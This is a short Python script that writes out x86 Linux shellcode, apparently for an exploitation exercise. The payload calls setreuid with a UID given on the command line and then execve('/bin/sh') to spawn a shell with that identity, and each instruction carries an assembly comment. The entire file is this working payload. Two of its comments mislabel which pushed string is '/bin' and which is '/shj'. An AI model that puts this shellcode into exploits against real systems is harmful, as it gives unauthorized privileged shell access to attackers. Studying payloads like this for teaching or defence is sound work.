#!/usr/bin/env python

import sys

uid     = int(sys.argv[1])
euid    = ("%x" % uid).decode("hex")[::-1]

shellcode  = ""
shellcode += "\x31\xc0"             # xor eax, eax                 ; eax = 0
shellcode += "\x31\xdb"             # xor ebx, ebx                 ; ebx = 0
shellcode += "\x31\xc9"             # xor ecx, ecx                 ; ecx = 0
shellcode += "\xb0\x46"             # mov al, 0x46                 ; eax = 70
shellcode += "\x66\xbb" + euid      # mov bx, euid                 ; ebx = euid
shellcode += "\x66\xb9" + euid      # mov cx, euid                 ; ecx = euid
shellcode += "\xcd\x80"             # int 0x80                     ; setreuid(euid, euid)
shellcode += "\x31\xc0"             # xor eax, eax                 ; eax = 0
shellcode += "\x89\xe5"             # mov ebp, esp                 ;
shellcode += "\x68\x2f\x73\x68\x6a" # push dword 0x6a68732f        ; push '/bin'
shellcode += "\x68\x2f\x62\x69\x6e" # push dword 0x6e69622f        ; push '/shj'
shellcode += "\xc0\x6c\x24\x07\x08" # shr byte [esp+0x7], byte 0x8 ; (esp[7] >> 8) == 0 => push '/bin/sh\0'
shellcode += "\x31\xc9"             # xor ecx, ecx                 ; ecx = 0
shellcode += "\x31\xd2"             # xor edx, edx                 ; edx = 0
shellcode += "\x89\xe3"             # mov ebx, esp                 ; ebx = esp
shellcode += "\xb0\x0b"             # mov al, 0xb                  ; eax = 11
shellcode += "\xcd\x80"             # int 0x80                     ; execve("/bin/sh", NULL, NULL)

sys.stdout.write(shellcode)
